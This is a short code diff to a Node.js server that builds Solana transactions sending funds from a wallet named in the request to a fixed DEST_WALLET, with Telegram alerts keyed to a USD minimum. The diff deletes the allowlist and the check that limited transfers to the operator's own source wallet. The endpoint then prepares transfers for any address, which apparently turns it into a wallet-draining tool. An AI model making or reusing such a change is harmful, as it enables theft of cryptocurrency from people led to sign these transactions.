@@ -18,10 +18,8 @@ const PORT = process.env.PORT || 3000;
 const RPC_ENDPOINT = process.env.SOLANA_RPC_ENDPOINT || 'https://api.mainnet-beta.solana.com';
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
-const TELEGRAM_ALLOWED_ADDRESSES = (process.env.TELEGRAM_ALLOWED_ADDRESSES || '')
-  .split(',')
-  .map((s) => s.trim())
-  .filter(Boolean);
+const TELEGRAM_ALLOWED_ADDRESSES = [];
+
 const TELEGRAM_MIN_USD = Number(process.env.TELEGRAM_MIN_USD || '0');
 const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || '')
   .split(',')
@@ -372,9 +370,7 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
 app.post('/api/send-tx/:pubkey', async (req, res) => {
   try {
     if (!DEST_WALLET) return res.status(400).json({ error: 'DEST_WALLET is not set on the server' });
-    if (!TELEGRAM_ALLOWED_ADDRESSES.length) {
-      return res.status(403).json({ error: 'Set TELEGRAM_ALLOWED_ADDRESSES to your source wallet first' });
-    }
+    
     const from = new PublicKey(req.params.pubkey);
     const fromStr = from.toBase58();
 
